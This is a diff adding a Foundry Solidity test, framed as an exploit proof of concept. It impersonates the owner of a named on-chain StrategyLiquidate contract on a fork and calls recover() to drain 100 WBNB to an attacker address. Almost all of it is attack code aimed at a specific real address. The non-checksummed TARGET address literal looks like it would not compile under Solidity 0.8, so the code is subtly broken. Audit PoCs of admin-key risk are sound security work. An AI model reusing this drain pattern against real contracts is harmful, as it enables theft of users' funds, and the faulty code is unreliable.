@@ -1,0 +1,70 @@
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import "forge-std/Test.sol";
+
+// Minimal interfaces for the target contract
+interface IStrategyLiquidate {
+    function owner() external view returns (address);
+    function isOwner() external view returns (bool);
+    function recover(address token, address to, uint256 value) external;
+    function transferOwnership(address newOwner) external;
+    function swapMiningReward(address minter, address token) external;
+    function execute(address, address borrowToken, uint256, uint256, bytes calldata data) external payable;
+    // include other functions if needed, but not required for the PoC
+}
+
+interface IWBNB {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function deposit() external payable;
+    function withdraw(uint256 amount) external;
+}
+
+contract ExploitTest is Test {
+    address constant TARGET = 0x5085c49828b0b8e69bae99d96a8e0fcf0a033369;
+    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
+    address constant ATTACKER = address(0xdeadbeef); // some arbitrary attacker address
+
+    IStrategyLiquidate target;
+    IWBNB wbnb;
+
+    function setUp() public {
+        // Label for debugging
+        vm.label(TARGET, "StrategyLiquidate");
+        vm.label(WBNB, "WBNB");
+        vm.label(ATTACKER, "Attacker");
+
+        target = IStrategyLiquidate(TARGET);
+        wbnb = IWBNB(WBNB);
+
+        // Give the contract some WBNB to demonstrate the drain
+        // Using deal to set WBNB balance directly on fork (cheatcode works for any ERC20)
+        deal(WBNB, TARGET, 100 ether);
+    }
+
+    function testAdminCanDrainFunds() public {
+        // Get the current owner
+        address owner = target.owner();
+        vm.label(owner, "CurrentOwner");
+
+        // 1. Impersonate the owner (simulating compromised admin key)
+        vm.startPrank(owner);
+
+        // 2. Transfer all WBNB from the contract to the attacker
+        target.recover(WBNB, ATTACKER, 100 ether);
+
+        vm.stopPrank();
+
+        // 3. Assert that the attacker received the WBNB
+        uint256 attackerBalance = wbnb.balanceOf(ATTACKER);
+        assertEq(attackerBalance, 100 ether, "Attacker did not receive WBNB");
+
+        // 4. Optional: also assert the contract lost its balance
+        uint256 contractBalance = wbnb.balanceOf(TARGET);
+        assertEq(contractBalance, 0, "Contract still holds WBNB");
+    }
+}
+```
